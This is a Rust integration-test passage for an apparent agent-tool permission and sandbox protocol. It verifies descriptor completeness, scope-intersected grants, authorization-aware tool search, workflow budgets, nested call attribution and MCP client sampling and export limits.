// SPDX-License-Identifier: Elastic-2.0

//! R1-21 verification contract.
//!
//! Each module corresponds to one row of the check table in
//! `plan/contracts/R1-21.md`. The rows that require a value to be
//! *unrepresentable* are carried by paired `compile_fail`/`no_run` doc tests
//! on the types themselves, because an integration test can only exercise
//! programs that compile; those pairs run under `cargo test --doc`.

use automonique_protocol::identity::Actor;
use automonique_protocol::primitives::ValueError;
use automonique_protocol::sandbox::{FilesystemAccess, SandboxProfile, ToolWorkloadEgress};
use automonique_protocol::tools::{
    ApprovalRequirement, ArgumentSchema, ArgumentSlot, ArtifactRetention, BackendContribution,
    BackendExtensionKind, CallBudget, CapabilityId, CausationId, CpuBudget, CredentialAudiences,
    DiscoveryTimeout, ExportItem, ExtensionContribution, ExtensionManifest, ExtensionManifestParts,
    ExtensionSignature, GrantScope, HookAction, HookBinding, HookChain, HookClass,
    HookFailurePolicy, HookOutcome, HookPower, HookTimeout, MAX_TOOL_FIELD_BYTES,
    McpClientDescriptor, McpClientParts, McpCredentialMapping, McpServerExport, McpToolFilter,
    McpTransport, McpTrustBoundary, MemoryBudget, MigrationBehavior, NestedCallCost, NestedCause,
    OutputBudget, OutputContract, PinnedExecutable, Platform, PlatformSupport,
    ProhibitedHookAction, PromptExport, ProvenanceDigest, RESERVED_CAPABILITIES, ResourceBudget,
    ResourceExport, RunId, SamplingGrant, SchemaContract, ScopedGrant, SecretCommand,
    SecretRetrieval, SecretSource, SessionToolset, SideEffectClass, SupportedRange, Surface,
    SurfaceContribution, ToolDescriptor, ToolDescriptorParts, ToolError, ToolsetChange,
    ToolsetGrant, TrustClass, UiSurface, UpdateChannel, VaultProvider, WallClockBudget,
    WorkflowBudget, WorkflowCapability, WorkflowInvocable, WorkflowSpec, describe_tool,
    effective_grant, search_tools,
};

fn schema(id: &str) -> SchemaContract {
    SchemaContract::new(id, "sha256:schema").expect("valid schema contract")
}

fn profile() -> SandboxProfile {
    SandboxProfile::new(
        "workspace-offline",
        1,
        FilesystemAccess::IsolatedWritable,
        ToolWorkloadEgress::denied(),
    )
    .expect("valid profile")
}

fn resources() -> ResourceBudget {
    ResourceBudget::new(
        WallClockBudget::millis(60_000).expect("valid wall clock budget"),
        CpuBudget::millis(30_000).expect("valid cpu budget"),
        MemoryBudget::bytes(1 << 28).expect("valid memory budget"),
        OutputBudget::bytes(1 << 20).expect("valid output budget"),
    )
}

fn descriptor(
    id: &str,
    capability: &str,
    side_effect: SideEffectClass,
    approval: ApprovalRequirement,
) -> ToolDescriptor {
    declared(id, capability, side_effect, approval).expect("valid descriptor")
}

fn declared(
    id: &str,
    capability: &str,
    side_effect: SideEffectClass,
    approval: ApprovalRequirement,
) -> Result<ToolDescriptor, ToolError> {
    ToolDescriptor::declare(ToolDescriptorParts {
        id,
        capability: CapabilityId::new(capability).expect("valid capability"),
        input_schema: schema("automonique.tool.input/v1"),
        output_schema: schema("automonique.tool.output/v1"),
        provenance: ProvenanceDigest::new("sha256:implementation").expect("valid digest"),
        trust: TrustClass::FirstParty,
        side_effect,
        approval,
        sandbox_profile: profile(),
        credential_audiences: CredentialAudiences::none(),
        egress: ToolWorkloadEgress::denied(),
        resources: resources(),
        platforms: PlatformSupport::new(&[Platform::Linux]).expect("valid platform support"),
        output_contract: OutputContract::Inline {
            schema: schema("automonique.tool.output/v1"),
        },
    })
}

fn tool(id: &str, side_effect: SideEffectClass) -> ToolDescriptor {
    descriptor(id, id, side_effect, ApprovalRequirement::PerInvocation)
}

fn grant(ids: &[&str]) -> ToolsetGrant {
    ToolsetGrant::new(ids).expect("valid grant")
}

fn cause() -> NestedCause {
    NestedCause::root(
        Actor::new("acme", "operator-1").expect("valid actor"),
        RunId::new("run-1").expect("valid run id"),
        CausationId::new("turn-1").expect("valid causation id"),
    )
}

mod descriptor_completeness {
    use super::*;

    #[test]
    fn every_declared_field_is_carried_and_readable() {
        let declared = ToolDescriptor::declare(ToolDescriptorParts {
            id: "fs.write",
            capability: CapabilityId::new("automonique.fs.write").expect("valid capability"),
            input_schema: SchemaContract::new("fs.write.input/v1", "sha256:in")
                .expect("valid schema"),
            output_schema: SchemaContract::new("fs.write.output/v1", "sha256:out")
                .expect("valid schema"),
            provenance: ProvenanceDigest::new("sha256:impl").expect("valid digest"),
            trust: TrustClass::ReviewedPublisher,
            side_effect: SideEffectClass::WorkspaceWrite,
            approval: ApprovalRequirement::PerInvocation,
            sandbox_profile: profile(),
            credential_audiences: CredentialAudiences::exactly(&["artifact-store"])
                .expect("valid audiences"),
            egress: ToolWorkloadEgress::denied(),
            resources: resources(),
            platforms: PlatformSupport::new(&[Platform::Linux, Platform::MacOs])
                .expect("valid platform support"),
            output_contract: OutputContract::Artifact {
                schema: SchemaContract::new("fs.write.artifact/v1", "sha256:artifact")
                    .expect("valid schema"),
                retention: ArtifactRetention::Run,
            },
        })
        .expect("valid descriptor");

        assert_eq!(declared.id(), "fs.write");
        assert_eq!(declared.capability().as_str(), "automonique.fs.write");
        assert_eq!(declared.input_schema().id(), "fs.write.input/v1");
        assert_eq!(declared.input_schema().digest(), "sha256:in");
        assert_eq!(declared.output_schema().id(), "fs.write.output/v1");
        assert_eq!(declared.provenance().as_str(), "sha256:impl");
        assert_eq!(declared.trust(), TrustClass::ReviewedPublisher);
        assert_eq!(declared.side_effect(), SideEffectClass::WorkspaceWrite);
        assert_eq!(declared.approval(), ApprovalRequirement::PerInvocation);
        assert_eq!(declared.sandbox_profile().id(), "workspace-offline");
        assert_eq!(
            declared.credential_audiences().audiences(),
            ["artifact-store"]
        );
        assert_eq!(declared.egress(), ToolWorkloadEgress::denied());
        assert_eq!(declared.resources(), resources());
        assert!(declared.platforms().supports(Platform::MacOs));
        assert!(!declared.platforms().supports(Platform::Windows));
        assert_eq!(
            declared.output_contract().retention(),
            Some(ArtifactRetention::Run)
        );
        assert_eq!(
            declared.output_contract().schema().id(),
            "fs.write.artifact/v1"
        );
    }

    #[test]
    fn side_effect_and_approval_are_carried_for_every_combination() {
        for side_effect in SideEffectClass::ALL {
            for approval in ApprovalRequirement::ALL {
                let declared = descriptor("t", "automonique.t", side_effect, approval);
                assert_eq!(
                    declared.side_effect(),
                    side_effect,
                    "{} was not carried",
                    side_effect.as_str()
                );
                assert_eq!(
                    declared.approval(),
                    approval,
                    "{} was not carried",
                    approval.as_str()
                );
            }
        }
    }

    #[test]
    fn a_descriptor_requires_a_non_empty_identifier() {
        let error = ToolDescriptor::declare(ToolDescriptorParts {
            id: "",
            capability: CapabilityId::new("automonique.t").expect("valid capability"),
            input_schema: schema("in/v1"),
            output_schema: schema("out/v1"),
            provenance: ProvenanceDigest::new("sha256:impl").expect("valid digest"),
            trust: TrustClass::FirstParty,
            side_effect: SideEffectClass::ReadOnly,
            approval: ApprovalRequirement::None,
            sandbox_profile: profile(),
            credential_audiences: CredentialAudiences::none(),
            egress: ToolWorkloadEgress::denied(),
            resources: resources(),
            platforms: PlatformSupport::new(&[Platform::Linux]).expect("valid platforms"),
            output_contract: OutputContract::Inline {
                schema: schema("out/v1"),
            },
        })
        .expect_err("an unnamed tool is not a tool");
        assert_eq!(error.category(), "field_invalid");
    }

    #[test]
    fn a_schema_contract_needs_both_an_identifier_and_a_digest() {
        assert!(SchemaContract::new("", "sha256:in").is_err());
        assert!(SchemaContract::new("in/v1", "").is_err());
        assert!(SchemaContract::new("in/v1", "sha256:in").is_ok());
    }

    #[test]
    fn platform_support_is_never_empty() {
        assert_eq!(
            PlatformSupport::new(&[])
                .expect_err("an empty list would read as every platform")
                .category(),
            "field_invalid"
        );
        assert_eq!(
            PlatformSupport::new(&Platform::ALL)
                .expect("valid platforms")
                .platforms()
                .len(),
            3
        );
    }

    #[test]
    fn a_credential_audience_is_declared_and_never_implied() {
        assert!(CredentialAudiences::none().is_empty());
        assert_eq!(
            CredentialAudiences::exactly(&["provider-api"])
                .expect("valid audiences")
                .audiences(),
            ["provider-api"]
        );
        assert!(CredentialAudiences::exactly(&[""]).is_err());
    }

    #[test]
    fn every_resource_ceiling_is_non_zero_and_bounded() {
        assert_eq!(
            WallClockBudget::millis(0)
                .expect_err("a zero budget permits nothing")
                .category(),
            "budget_is_zero"
        );
        assert_eq!(
            CpuBudget::millis(0).expect_err("zero").category(),
            "budget_is_zero"
        );
        assert_eq!(
            MemoryBudget::bytes(0).expect_err("zero").category(),
            "budget_is_zero"
        );
        assert_eq!(
            OutputBudget::bytes(0).expect_err("zero").category(),
            "budget_is_zero"
        );
        assert_eq!(
            WallClockBudget::millis(WallClockBudget::MAX + 1)
                .expect_err("above the ceiling")
                .category(),
            "budget_out_of_range"
        );
    }

    #[test]
    fn every_bounded_field_is_length_capped_and_free_of_control_characters() {
        // One screen serves every textual field in the module -- descriptor,
        // MCP, extension, hook and secret alike -- so it is measured here at
        // four of its call sites rather than left to code reading.
        let over_long = "x".repeat(MAX_TOOL_FIELD_BYTES + 1);
        let too_long = ValueError::TooLong {
            max_bytes: MAX_TOOL_FIELD_BYTES,
            actual_bytes: MAX_TOOL_FIELD_BYTES + 1,
        };

        assert_eq!(
            declared(
                &over_long,
                "automonique.fs.read",
                SideEffectClass::ReadOnly,
                ApprovalRequirement::PerInvocation,
            )
            .expect_err("a tool identifier longer than the field ceiling"),
            ToolError::Field {
                field: "tool_id",
                error: too_long,
            }
        );
        assert_eq!(
            CapabilityId::new(&over_long).expect_err("an over-long capability"),
            ToolError::Field {
                field: "capability_id",
                error: too_long,
            }
        );
        assert_eq!(
            HookOutcome::rejected(&over_long).expect_err("an over-long rejection reason"),
            ToolError::Field {
                field: "rejection_reason",
                error: too_long,
            }
        );
        assert_eq!(
            SecretSource::new(
                &over_long,
                "postgres",
                SecretRetrieval::SystemdCredential {
                    name: "db".to_owned()
                },
            )
            .expect_err("an over-long secret source identifier"),
            ToolError::Field {
                field: "secret_source_id",
                error: too_long,
            }
        );

        // The ceiling itself is admissible, so the refusals above are the
        // length screen and not an off-by-one that refuses everything.
        assert!(
            declared(
                &"x".repeat(MAX_TOOL_FIELD_BYTES),
                "automonique.fs.read",
                SideEffectClass::ReadOnly,
                ApprovalRequirement::PerInvocation,
            )
            .is_ok()
        );

        for (field, control) in [
            ("tool_id", "fs\u{0}read"),
            ("tool_id", "fs\nread"),
            ("tool_id", "fs\u{7f}read"),
        ] {
            assert_eq!(
                declared(
                    control,
                    "automonique.fs.read",
                    SideEffectClass::ReadOnly,
                    ApprovalRequirement::PerInvocation,
                )
                .expect_err("a control character in a field"),
                ToolError::Field {
                    field,
                    error: ValueError::ControlCharacter,
                },
                "{control:?} was accepted"
            );
        }
        assert_eq!(
            HookOutcome::rejected("policy\u{1}").expect_err("a control character in a reason"),
            ToolError::Field {
                field: "rejection_reason",
                error: ValueError::ControlCharacter,
            }
        );
        assert_eq!(
            SecretSource::new(
                "db-password",
                "postgres\u{0}",
                SecretRetrieval::SystemdCredential {
                    name: "db".to_owned()
                },
            )
            .expect_err("a control character in an audience"),
            ToolError::Field {
                field: "credential_audience",
                error: ValueError::ControlCharacter,
            }
        );
    }
}

mod grant_intersection {
    use super::*;

    #[test]
    fn effective_tools_are_the_intersection_of_every_scope() {
        let tenant = grant(&["fs.read", "fs.write", "net.fetch"]);
        let profile = grant(&["fs.read", "fs.write"]);
        let channel = grant(&["fs.read"]);

        let effective = tenant.intersect(&profile).intersect(&channel);
        assert_eq!(effective.allowed(), ["fs.read"]);
        assert!(effective.permits("fs.read"));
        assert!(!effective.permits("fs.write"));
    }

    #[test]
    fn a_narrow_scope_cannot_be_widened_by_a_broad_one() {
        let broad = grant(&["fs.read", "fs.write", "shell.exec"]);
        let messaging = grant(&["fs.read"]);
        assert_eq!(broad.intersect(&messaging).allowed(), ["fs.read"]);
        assert_eq!(messaging.intersect(&broad).allowed(), ["fs.read"]);
    }

    #[test]
    fn intersecting_with_an_empty_grant_permits_nothing() {
        let effective = grant(&["fs.read"]).intersect(&grant(&[]));
        assert!(effective.allowed().is_empty());
    }

    #[test]
    fn all_five_scopes_intersect_and_none_of_them_widens() {
        let scoped = vec![
            ScopedGrant::new(
                GrantScope::Tenant,
                grant(&["fs.read", "fs.write", "net.fetch", "shell.exec"]),
            ),
            ScopedGrant::new(
                GrantScope::Profile,
                grant(&["fs.read", "fs.write", "net.fetch"]),
            ),
            ScopedGrant::new(GrantScope::Workspace, grant(&["fs.read", "fs.write"])),
            ScopedGrant::new(
                GrantScope::Channel,
                grant(&["fs.read", "net.fetch", "shell.exec"]),
            ),
            ScopedGrant::new(GrantScope::Automation, grant(&["fs.read", "fs.write"])),
        ];
        assert_eq!(GrantScope::ALL.len(), scoped.len());

        let effective = effective_grant(&scoped);
        assert_eq!(effective.allowed(), ["fs.read"]);

        // Every scope is load-bearing: dropping any one of them can only widen
        // the result, never narrow it, and the broadest scope alone would have
        // granted the shell.
        for index in 0..scoped.len() {
            let mut without = scoped.clone();
            let dropped = without.remove(index);
            let widened = effective_grant(&without);
            assert!(
                widened.allowed().len() >= effective.allowed().len(),
                "dropping {} narrowed the effective grant",
                dropped.scope().as_str()
            );
        }
    }

    #[test]
    fn no_applicable_grant_permits_nothing() {
        assert!(effective_grant(&[]).allowed().is_empty());
    }

    #[test]
    fn intersection_is_order_insensitive_across_scopes() {
        let forward = vec![
            ScopedGrant::new(GrantScope::Tenant, grant(&["a", "b", "c"])),
            ScopedGrant::new(GrantScope::Channel, grant(&["b", "c"])),
            ScopedGrant::new(GrantScope::Automation, grant(&["c"])),
        ];
        let mut backward = forward.clone();
        backward.reverse();
        assert_eq!(
            effective_grant(&forward).allowed(),
            effective_grant(&backward).allowed()
        );
    }
}

mod search_authorization {
    use super::*;

    fn registry() -> Vec<ToolDescriptor> {
        vec![
            tool("fs.read", SideEffectClass::ReadOnly),
            tool("fs.write", SideEffectClass::WorkspaceWrite),
            tool("shell.exec", SideEffectClass::PrivilegedRequest),
        ]
    }

    #[test]
    fn search_returns_only_authorized_tools() {
        let results = search_tools(&registry(), &grant(&["fs.read", "fs.write"]), "");
        assert_eq!(results.matches(), ["fs.read", "fs.write"]);
        assert!(
            !results.matches().iter().any(|id| id == "shell.exec"),
            "search must not reveal an inaccessible tool"
        );
    }

    #[test]
    fn an_unauthorized_tool_is_absent_even_from_an_exact_query() {
        let results = search_tools(&registry(), &grant(&["fs.read"]), "shell.exec");
        assert!(
            results.is_empty(),
            "naming a tool exactly must not confirm it exists"
        );
    }

    #[test]
    fn search_cannot_be_called_without_a_grant() {
        assert!(search_tools(&registry(), &grant(&[]), "fs").is_empty());
    }

    #[test]
    fn describe_answers_the_same_way_for_absent_and_forbidden_tools() {
        let registry = registry();
        let authorized = grant(&["fs.read"]);
        assert_eq!(
            describe_tool(&registry, &authorized, "fs.read")
                .expect("an authorized tool describes")
                .input_schema()
                .id(),
            "automonique.tool.input/v1"
        );
        assert!(
            describe_tool(&registry, &authorized, "shell.exec").is_none(),
            "describing an unauthorized tool must not confirm it exists"
        );
        assert!(
            describe_tool(&registry, &authorized, "no.such.tool").is_none(),
            "the answer for a forbidden tool must match the answer for an absent one"
        );
    }

    #[test]
    fn looking_does_not_change_the_session_toolset() {
        let registry = registry();
        let mut session = SessionToolset::opened(grant(&["fs.read"]));
        let before = session.clone();

        let results = search_tools(&registry, session.grant(), "fs");
        assert_eq!(results.matches(), ["fs.read"]);
        assert!(describe_tool(&registry, session.grant(), "shell.exec").is_none());
        assert_eq!(session, before, "a search changed the session toolset");
        assert_eq!(session.revision(), 0);

        session.apply(ToolsetChange::recorded(
            grant(&["fs.read", "fs.write"]),
            cause(),
        ));
        assert_eq!(session.revision(), 1, "a durable change is what moves it");
        assert!(session.grant().permits("fs.write"));
    }

    #[test]
    fn no_error_category_can_carry_a_tool_identifier() {
        // The workflow refusal is the one place a caller names a tool it may
        // not reach; the error it gets back has no field to put it in.
        let error = ToolError::WorkflowToolNotEligible;
        assert_eq!(error.category(), "workflow_tool_not_eligible");
        assert!(
            !error.to_string().contains("shell.exec"),
            "a refusal must not echo a tool identifier"
        );
    }
}

mod workflow_bounds {
    use super::*;

    fn eligible(ids: &[&str]) -> Vec<WorkflowInvocable> {
        ids.iter()
            .map(|id| {
                WorkflowInvocable::eligible(&tool(id, SideEffectClass::ReadOnly))
                    .expect("an ordinary read tool is eligible")
            })
            .collect()
    }

    fn budget(calls: u32) -> WorkflowBudget {
        WorkflowBudget::new(
            CallBudget::calls(calls).expect("valid call budget"),
            ResourceBudget::new(
                WallClockBudget::millis(1_000).expect("valid wall clock budget"),
                CpuBudget::millis(500).expect("valid cpu budget"),
                MemoryBudget::bytes(4_096).expect("valid memory budget"),
                OutputBudget::bytes(8_192).expect("valid output budget"),
            ),
        )
    }

    fn capability(calls: u32) -> WorkflowCapability {
        WorkflowCapability::granted(WorkflowSpec::declare(
            eligible(&["fs.read"]),
            budget(calls),
            cause(),
        ))
    }

    fn free() -> NestedCallCost {
        NestedCallCost::new(0, 0, 0, 0)
    }

    #[test]
    fn a_workflow_stops_at_its_call_ceiling() {
        let mut capability = capability(2);
        capability
            .invoke("fs.read", CausationId::new("c-1").expect("id"), free())
            .expect("first call");
        capability
            .invoke("fs.read", CausationId::new("c-2").expect("id"), free())
            .expect("second call");
        let error = capability
            .invoke("fs.read", CausationId::new("c-3").expect("id"), free())
            .expect_err("over the ceiling");
        assert_eq!(error.category(), "workflow_budget_exceeded");
        assert_eq!(
            error,
            ToolError::WorkflowBudgetExceeded {
                budget: "max_calls"
            }
        );
        assert_eq!(capability.calls_made(), 2);
    }

    #[test]
    fn every_declared_budget_is_fixed_and_charged() {
        // One case per budget: a cost that exceeds exactly that ceiling.
        for (budget, cost) in [
            ("wall_clock", NestedCallCost::new(1_001, 0, 0, 0)),
            ("cpu", NestedCallCost::new(0, 501, 0, 0)),
            ("memory", NestedCallCost::new(0, 0, 4_097, 0)),
            ("output", NestedCallCost::new(0, 0, 0, 8_193)),
        ] {
            let mut capability = capability(16);
            let error = capability
                .invoke("fs.read", CausationId::new("c-1").expect("id"), cost)
                .expect_err("the call exceeds a declared budget");
            assert_eq!(
                error,
                ToolError::WorkflowBudgetExceeded { budget },
                "the {budget} budget did not stop the call"
            );
            assert_eq!(
                capability.calls_made(),
                0,
                "a refused call was charged against {budget}"
            );
            assert_eq!(
                capability.spent(),
                NestedCallCost::new(0, 0, 0, 0),
                "a refused {budget} call charged something against the capability"
            );
        }
    }

    #[test]
    fn a_refusal_charges_nothing_even_when_earlier_calls_did() {
        // The refusal path must leave the ledger where the last admitted call
        // left it, not where the refused call would have moved it.
        let mut capability = capability(16);
        let first = NestedCallCost::new(100, 200, 1_000, 2_000);
        capability
            .invoke("fs.read", CausationId::new("c-1").expect("id"), first)
            .expect("the first call fits every budget");
        assert_eq!(capability.spent(), first);

        let refused = NestedCallCost::new(0, 400, 0, 0);
        assert_eq!(
            capability
                .invoke("fs.read", CausationId::new("c-2").expect("id"), refused)
                .expect_err("600ms of cpu against a 500ms budget"),
            ToolError::WorkflowBudgetExceeded { budget: "cpu" }
        );
        assert_eq!(
            capability.spent(),
            first,
            "the refused call was charged anyway"
        );
        assert_eq!(capability.calls_made(), 1);
    }

    #[test]
    fn cpu_accumulates_across_calls_rather_than_being_a_per_call_ceiling() {
        let mut capability = capability(16);
        let half = NestedCallCost::new(0, 300, 0, 0);
        capability
            .invoke("fs.read", CausationId::new("c-1").expect("id"), half)
            .expect("the first call fits");
        assert_eq!(
            capability.spent().cpu_millis(),
            300,
            "an admitted call was not charged for cpu"
        );
        assert_eq!(
            capability
                .invoke("fs.read", CausationId::new("c-2").expect("id"), half)
                .expect_err("the second call crosses the cpu ceiling"),
            ToolError::WorkflowBudgetExceeded { budget: "cpu" }
        );
        assert_eq!(capability.spent().cpu_millis(), 300);
        assert_eq!(capability.calls_made(), 1);
    }

    #[test]
    fn output_accumulates_across_calls_rather_than_being_a_per_call_ceiling() {
        let mut capability = capability(16);
        let half = NestedCallCost::new(0, 0, 0, 5_000);
        capability
            .invoke("fs.read", CausationId::new("c-1").expect("id"), half)
            .expect("the first call fits");
        assert_eq!(
            capability.spent().output_bytes(),
            5_000,
            "an admitted call was not charged for output"
        );
        assert_eq!(
            capability
                .invoke("fs.read", CausationId::new("c-2").expect("id"), half)
                .expect_err("the second call crosses the output ceiling"),
            ToolError::WorkflowBudgetExceeded { budget: "output" }
        );
        assert_eq!(capability.spent().output_bytes(), 5_000);
        assert_eq!(capability.calls_made(), 1);
    }

    #[test]
    fn memory_is_charged_as_a_peak_and_is_kept() {
        let mut capability = capability(16);
        capability
            .invoke(
                "fs.read",
                CausationId::new("c-1").expect("id"),
                NestedCallCost::new(0, 0, 3_000, 0),
            )
            .expect("the first call fits");
        assert_eq!(
            capability.spent().memory_bytes(),
            3_000,
            "the observed peak was not kept"
        );
        // A smaller second call still fits -- memory is a high-water mark, not
        // a running total -- and it must not lower the peak.
        capability
            .invoke(
                "fs.read",
                CausationId::new("c-2").expect("id"),
                NestedCallCost::new(0, 0, 2_000, 0),
            )
            .expect("a smaller call fits under a peak, not under a sum");
        assert_eq!(
            capability.spent().memory_bytes(),
            3_000,
            "a smaller call lowered the peak"
        );
        capability
            .invoke(
                "fs.read",
                CausationId::new("c-3").expect("id"),
                NestedCallCost::new(0, 0, 4_096, 0),
            )
            .expect("the ceiling itself fits");
        assert_eq!(capability.spent().memory_bytes(), 4_096);
    }

    #[test]
    fn budgets_accumulate_across_calls() {
        let mut capability = capability(16);
        let half = NestedCallCost::new(600, 0, 0, 0);
        capability
            .invoke("fs.read", CausationId::new("c-1").expect("id"), half)
            .expect("first call fits");
        assert_eq!(capability.spent().wall_clock_millis(), 600);
        let error = capability
            .invoke("fs.read", CausationId::new("c-2").expect("id"), half)
            .expect_err("the second call crosses the wall-clock ceiling");
        assert_eq!(
            error,
            ToolError::WorkflowBudgetExceeded {
                budget: "wall_clock"
            }
        );
        assert_eq!(capability.calls_made(), 1);
        assert_eq!(capability.spent().wall_clock_millis(), 600);
    }

    #[test]
    fn a_workflow_cannot_reach_a_tool_outside_its_eligible_set() {
        let mut capability = capability(16);
        assert_eq!(
            capability
                .invoke("shell.exec", CausationId::new("c-1").expect("id"), free())
                .expect_err("an ineligible tool is not reachable"),
            ToolError::WorkflowToolNotEligible
        );
        assert_eq!(capability.calls_made(), 0);
    }

    #[test]
    fn a_privilege_broker_is_not_admissible_to_a_workflow() {
        let broker = tool("privilege.request", SideEffectClass::PrivilegedRequest);
        assert_eq!(
            WorkflowInvocable::eligible(&broker).expect_err("a broker is not workflow-reachable"),
            ToolError::WorkflowToolNotEligible
        );
    }

    #[test]
    fn no_reserved_capability_is_admissible_to_a_workflow() {
        for capability in RESERVED_CAPABILITIES {
            let reserved = descriptor(
                "some.tool",
                capability,
                SideEffectClass::ReadOnly,
                ApprovalRequirement::PerInvocation,
            );
            assert_eq!(
                WorkflowInvocable::eligible(&reserved)
                    .expect_err("a reserved capability is not workflow-reachable"),
                ToolError::WorkflowToolNotEligible,
                "{capability} was admitted to a workflow"
            );
        }
        assert_eq!(RESERVED_CAPABILITIES.len(), 5);
    }

    #[test]
    fn a_zero_call_budget_is_not_representable() {
        assert_eq!(
            CallBudget::calls(0).expect_err("zero calls").category(),
            "budget_is_zero"
        );
        assert_eq!(
            CallBudget::calls(CallBudget::MAX + 1)
                .expect_err("above the ceiling")
                .category(),
            "budget_out_of_range"
        );
    }
}

mod nested_causation {
    use super::*;

    fn capability() -> WorkflowCapability {
        let eligible = vec![
            WorkflowInvocable::eligible(&descriptor(
                "fs.read",
                "automonique.fs.read",
                SideEffectClass::ReadOnly,
                ApprovalRequirement::PerInvocation,
            ))
            .expect("eligible"),
            WorkflowInvocable::eligible(&descriptor(
                "net.fetch",
                "automonique.net.fetch",
                SideEffectClass::ExternalEffect,
                ApprovalRequirement::PerSession,
            ))
            .expect("eligible"),
        ];
        WorkflowCapability::granted(WorkflowSpec::declare(
            eligible,
            WorkflowBudget::new(CallBudget::calls(8).expect("valid"), resources()),
            cause(),
        ))
    }

    #[test]
    fn every_nested_call_carries_actor_run_and_causation() {
        let mut capability = capability();
        let receipt = capability
            .invoke(
                "fs.read",
                CausationId::new("step-1").expect("id"),
                NestedCallCost::new(1, 1, 1, 1),
            )
            .expect("an eligible call");

        assert_eq!(receipt.cause().actor().tenant(), "acme");
        assert_eq!(receipt.cause().actor().id(), "operator-1");
        assert_eq!(receipt.cause().run().as_str(), "run-1");
        assert_eq!(receipt.cause().causation().as_str(), "step-1");
        assert_eq!(
            receipt
                .cause()
                .parent()
                .expect("a nested call has a parent step")
                .as_str(),
            "turn-1"
        );
    }

    #[test]
    fn a_nested_call_cannot_be_attributed_to_another_actor_or_run() {
        let mut capability = capability();
        let workflow_cause = capability.spec().cause().clone();
        let receipt = capability
            .invoke("fs.read", CausationId::new("step-1").expect("id"), free())
            .expect("an eligible call");

        assert_eq!(receipt.cause().actor(), workflow_cause.actor());
        assert_eq!(receipt.cause().run(), workflow_cause.run());
    }

    #[test]
    fn sibling_calls_share_a_parent_and_differ_by_step() {
        let mut capability = capability();
        let first = capability
            .invoke("fs.read", CausationId::new("step-1").expect("id"), free())
            .expect("first call");
        let second = capability
            .invoke("net.fetch", CausationId::new("step-2").expect("id"), free())
            .expect("second call");

        assert_eq!(first.cause().parent(), second.cause().parent());
        assert_ne!(first.cause().causation(), second.cause().causation());
        assert_eq!(first.cause().run(), second.cause().run());
    }

    #[test]
    fn a_nested_call_remains_subject_to_ordinary_approval() {
        let mut capability = capability();
        let approved_per_invocation = capability
            .invoke("fs.read", CausationId::new("step-1").expect("id"), free())
            .expect("first call");
        assert_eq!(
            approved_per_invocation.approval_required(),
            ApprovalRequirement::PerInvocation
        );

        let approved_per_session = capability
            .invoke("net.fetch", CausationId::new("step-2").expect("id"), free())
            .expect("second call");
        assert_eq!(
            approved_per_session.approval_required(),
            ApprovalRequirement::PerSession
        );
    }

    #[test]
    fn a_cause_chain_keeps_its_principal_across_depth() {
        let root = cause();
        let child = root.caused(CausationId::new("step-1").expect("id"));
        let grandchild = child.caused(CausationId::new("step-2").expect("id"));

        assert_eq!(grandchild.actor(), root.actor());
        assert_eq!(grandchild.run(), root.run());
        assert_eq!(
            grandchild.parent().expect("a child has a parent"),
            child.causation()
        );
        assert!(root.parent().is_none(), "the root has no parent step");
    }

    fn free() -> NestedCallCost {
        NestedCallCost::new(0, 0, 0, 0)
    }
}

mod mcp_boundaries {
    use super::*;

    fn client() -> McpClientDescriptor {
        McpClientDescriptor::declare(McpClientParts {
            name: "acme-tickets",
            transport: McpTransport::LocalStdio,
            trust_boundary: McpTrustBoundary::AttestedChildSandbox,
            discovery_timeout: DiscoveryTimeout::millis(5_000).expect("valid timeout"),
            tool_filter: McpToolFilter::exactly(&["ticket.read"]).expect("valid filter"),
            credential_mapping: McpCredentialMapping::exactly(&[(
                "ACME_TOKEN",
                "acme-tickets-api",
            )])
            .expect("valid mapping"),
        })
        .expect("valid client")
    }

    #[test]
    fn a_client_declares_transport_trust_timeout_filter_and_credentials() {
        let declared = client();
        assert_eq!(declared.name(), "acme-tickets");
        assert_eq!(declared.transport(), McpTransport::LocalStdio);
        assert_eq!(
            declared.trust_boundary(),
            McpTrustBoundary::AttestedChildSandbox
        );
        assert_eq!(declared.discovery_timeout().get(), 5_000);
        assert!(declared.tool_filter().imports("ticket.read"));
        assert!(
            !declared.tool_filter().imports("ticket.delete"),
            "a filter that is not exhaustive is not a filter"
        );
        assert_eq!(
            declared.credential_mapping().entries(),
            [("ACME_TOKEN".to_owned(), "acme-tickets-api".to_owned())]
        );
    }

    #[test]
    fn sampling_is_off_for_a_declared_client() {
        assert!(
            !client().sampling().is_enabled(),
            "server-initiated sampling must be off unless someone enabled it"
        );
        assert!(client().sampling().grant().is_none());
    }

    #[test]
    fn enabled_sampling_carries_a_budget_and_an_approval() {
        let enabled = client().with_sampling(
            SamplingGrant::new(resources(), ApprovalRequirement::PerInvocation)
                .expect("valid grant"),
        );
        let grant = enabled
            .sampling()
            .grant()
            .expect("sampling was enabled explicitly");
        assert_eq!(grant.approval(), ApprovalRequirement::PerInvocation);
        assert_eq!(grant.budget(), resources());
        assert!(enabled.sampling().is_enabled());
    }

    #[test]
    fn sampling_cannot_be_enabled_without_an_approval() {
        assert_eq!(
            SamplingGrant::new(resources(), ApprovalRequirement::None)
                .expect_err("an unapproved server-initiated request is implicit authority"),
            ToolError::SamplingNeedsApproval
        );
    }

    #[test]
    fn a_discovery_timeout_is_bounded_and_non_zero() {
        // Named as a literal so raising the constant is a test failure rather
        // than a silent widening: `MAX_MILLIS + 1` alone measures nothing.
        assert_eq!(
            DiscoveryTimeout::MAX_MILLIS,
            120_000,
            "the declared discovery ceiling is 120s"
        );
        assert_eq!(
            DiscoveryTimeout::millis(0).expect_err("zero").category(),
            "budget_is_zero"
        );
        assert_eq!(
            DiscoveryTimeout::millis(DiscoveryTimeout::MAX_MILLIS + 1)
                .expect_err("unbounded discovery")
                .category(),
            "budget_out_of_range"
        );
    }

    fn export_items() -> Vec<ExportItem> {
        vec![
            ExportItem::Tool(CapabilityId::new("automonique.fs.read").expect("valid")),
            ExportItem::Tool(CapabilityId::new("automonique.shell.exec").expect("valid")),
            ExportItem::Resource(
                ResourceExport::new(
                    CapabilityId::new("automonique.artifact.review").expect("valid"),
                    "review-bundle",
                    ArtifactRetention::Run,
                )
                .expect("valid"),
            ),
            ExportItem::Prompt(
                PromptExport::new(
                    CapabilityId::new("automonique.prompt.triage").expect("valid"),
                    "triage",
                    schema("prompt/v1"),
                )
                .expect("valid"),
            ),
        ]
    }

    #[test]
    fn an_export_is_capability_filtered() {
        let items = export_items();
        let export = McpServerExport::capability_filtered(
            &items,
            &grant(&["automonique.fs.read", "automonique.prompt.triage"]),
        );

        let exported: Vec<&str> = export
